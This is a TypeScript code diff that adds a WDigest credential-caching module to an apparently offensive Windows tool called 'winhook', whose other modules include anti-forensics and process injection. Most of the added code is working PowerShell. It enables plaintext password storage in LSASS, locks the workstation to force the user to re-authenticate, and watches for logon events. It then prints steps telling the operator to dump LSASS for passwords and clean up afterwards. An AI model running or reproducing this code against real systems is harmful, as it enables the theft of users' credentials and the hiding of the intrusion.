@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  wdigest_enable: {
+    description:
+      "WDigest credential caching control — enable or disable UseLogonCredential registry key to force plaintext password storage in LSASS memory. When enabled, next interactive logon caches cleartext credentials retrievable via lsass_dump. Check current status, enable for credential harvesting, disable to restore, and force re-authentication via lock screen",
+    args: "--action check|enable|disable|lock [--wait-logon]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -17615,6 +17620,157 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function wdigestEnable(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const waitLogon = hasFlag(args, "--wait-logon")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] WDigest credential caching control...\n"]
+
+  if (action === "check") {
+    const script = `
+$regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'
+Write-Output "=== WDigest Configuration ==="
+try {
+  $val = Get-ItemProperty -Path $regPath -Name UseLogonCredential -ErrorAction Stop
+  Write-Output "UseLogonCredential: $($val.UseLogonCredential)"
+  if ($val.UseLogonCredential -eq 1) {
+    Write-Output "STATUS: ENABLED — plaintext credentials WILL be cached in LSASS on next logon"
+  } else {
+    Write-Output "STATUS: DISABLED — plaintext credentials NOT cached"
+  }
+} catch {
+  Write-Output "UseLogonCredential: NOT SET (default = disabled on Win 8.1+/2012R2+)"
+  Write-Output "STATUS: DISABLED — plaintext credentials NOT cached"
+}
+$os = Get-CimInstance Win32_OperatingSystem
+Write-Output "OS: $($os.Caption) Build $($os.BuildNumber)"
+if ([int]$os.BuildNumber -lt 9600) {
+  Write-Output "NOTE: WDigest caching is ENABLED by default on this OS version (pre-8.1/2012R2)"
+}
+# Check if Credential Guard is active
+$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue
+if ($dg -and $dg.SecurityServicesRunning -contains 1) {
+  Write-Output "WARNING: Credential Guard is ACTIVE — WDigest caching may not expose credentials"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("ENABLED")) {
+      findings.push({
+        checkId: "WDIGEST-001",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+        title: "WDigest plaintext credential caching is enabled",
+        details: "UseLogonCredential=1 — LSASS will cache plaintext passwords on next interactive logon",
+        remediation: "Set UseLogonCredential to 0 or remove the registry value.",
+      })
+    }
+  }
+
+  if (action === "enable") {
+    const script = `
+$regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'
+if (-not (Test-Path $regPath)) {
+  New-Item -Path $regPath -Force | Out-Null
+}
+Set-ItemProperty -Path $regPath -Name UseLogonCredential -Value 1 -Type DWord -Force
+$verify = (Get-ItemProperty -Path $regPath -Name UseLogonCredential).UseLogonCredential
+if ($verify -eq 1) {
+  Write-Output "SUCCESS: WDigest UseLogonCredential set to 1"
+  Write-Output "Plaintext credentials will be cached in LSASS on NEXT interactive logon"
+  Write-Output ""
+  Write-Output "Next steps:"
+  Write-Output "  1. Wait for user to log in interactively (or use --action lock to force)"
+  Write-Output "  2. Run: winhook lsass_dump"
+  Write-Output "  3. Plaintext passwords will appear in dump"
+  Write-Output "  4. Run: winhook wdigest_enable --action disable (cleanup)"
+} else {
+  Write-Output "FAILED: Could not set UseLogonCredential — check permissions"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    findings.push({
+      checkId: "WDIGEST-002",
+      provider: "winhook",
+      severity: "critical",
+      status: r.stdout.includes("SUCCESS") ? "PASS" : "FAIL",
+      resource: "WDigest",
+      title: "WDigest plaintext caching enabled",
+      details: r.stdout.substring(0, 500),
+      remediation: "Run winhook wdigest_enable --action disable after credential harvesting.",
+    })
+  }
+
+  if (action === "disable") {
+    const script = `
+$regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'
+Set-ItemProperty -Path $regPath -Name UseLogonCredential -Value 0 -Type DWord -Force
+$verify = (Get-ItemProperty -Path $regPath -Name UseLogonCredential).UseLogonCredential
+if ($verify -eq 0) {
+  Write-Output "SUCCESS: WDigest UseLogonCredential set to 0 — plaintext caching disabled"
+} else {
+  Write-Output "FAILED: Could not disable UseLogonCredential"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "lock") {
+    const script = `
+Write-Output "=== Forcing workstation lock to trigger re-authentication ==="
+$signature = @'
+[DllImport("user32.dll")]
+public static extern bool LockWorkStation();
+'@
+$type = Add-Type -MemberDefinition $signature -Name WinAPI -Namespace LockScreen -PassThru
+$result = $type::LockWorkStation()
+if ($result) {
+  Write-Output "SUCCESS: Workstation locked — user must re-authenticate"
+  Write-Output "WDigest will cache plaintext credentials upon next interactive logon"
+  Write-Output "After user logs back in, run: winhook lsass_dump"
+} else {
+  Write-Output "FAILED: Could not lock workstation (may need interactive session)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (waitLogon) {
+    output.push("\n[*] Monitoring for new interactive logons...")
+    const script = `
+$startTime = Get-Date
+Write-Output "Watching for logon events since $startTime..."
+$timeout = 300
+$elapsed = 0
+while ($elapsed -lt $timeout) {
+  $events = Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624;StartTime=$startTime} -ErrorAction SilentlyContinue |
+    Where-Object { $_.Properties[8].Value -in @(2, 10, 11) }
+  if ($events) {
+    foreach ($e in $events) {
+      Write-Output "LOGON DETECTED: $($e.Properties[5].Value)\\$($e.Properties[6].Value) at $($e.TimeCreated)"
+    }
+    Write-Output "Credentials should now be cached in LSASS — run: winhook lsass_dump"
+    break
+  }
+  Start-Sleep -Seconds 5
+  $elapsed = (New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds
+}
+if ($elapsed -ge $timeout) {
+  Write-Output "TIMEOUT: No interactive logon detected within $timeout seconds"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -21234,6 +21390,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   ps_downgrade: psDowngrade,
   process_inject: processInject,
   anti_forensics: antiForensics,
+  wdigest_enable: wdigestEnable,
 }
 
 export const WinhookTool = Tool.define("winhook", {
